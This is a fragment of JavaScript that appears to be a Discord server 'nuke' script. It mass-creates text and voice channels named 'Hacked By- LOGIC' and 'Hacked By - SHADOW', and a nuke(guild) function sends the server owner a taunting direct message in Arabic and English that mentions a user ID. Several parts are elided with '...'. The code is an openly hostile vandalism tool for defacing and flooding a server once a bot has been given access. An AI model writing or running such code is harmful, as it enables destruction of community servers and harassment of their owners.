...
m.createChannel('Hacked By- LOGIC', 'text');
m.createChannel('Hacked By- SHADOW', 'text');
m.createChannel('Hacked By- LOGIC', 'text');
...
m.createChannel('Hacked By - SHADOW', 'voice');
m.createChannel('Hacked By - LOGIC', 'voice');
m.createChannel('Hacked By - SHADOW', 'voice');
m.createChannel('Hacked By - LOGIC', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked By - SHADOW <@318705077734998017>   متنصبش ع الناس درس لوجيك وشادوو  ').catch(e => { return void e; });
